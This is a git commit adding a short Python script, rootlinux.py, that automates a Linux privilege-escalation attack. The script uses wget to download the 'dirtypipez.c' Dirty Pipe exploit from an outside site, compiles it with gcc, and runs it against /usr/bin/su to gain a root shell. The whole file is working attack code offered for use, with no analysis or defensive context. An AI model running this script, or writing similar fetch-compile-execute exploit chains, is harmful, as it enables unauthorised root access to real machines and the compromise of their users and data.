367bda491e1644d488e03ac783879588c2401049
Juan Carlos Bindez <79322362+JuanBindez@users.noreply.github.com>
2022-03-14 09:23:56 -0300

    Update and rename screenLR.py to rootlinux.py

---
+++ rootlinux.py
@@ -0,0 +1,21 @@
+import os
+import time
+
+
+def down_pipez():
+    os.system("wget https://haxx.in/files/dirtypipez.c")
+    time.sleep(2)
+    
+def compi_pipez():
+    os.system("gcc dirtypipez.c -o dirtypipez")
+    print("ok compilado!!!")
+
+def root():
+    os.system("./dirtypipez /usr/bin/su")
+    
+#execution of program
+down_pipez()
+time.sleep(2)
+compi_pipez()
+time.sleep(2)
+root()
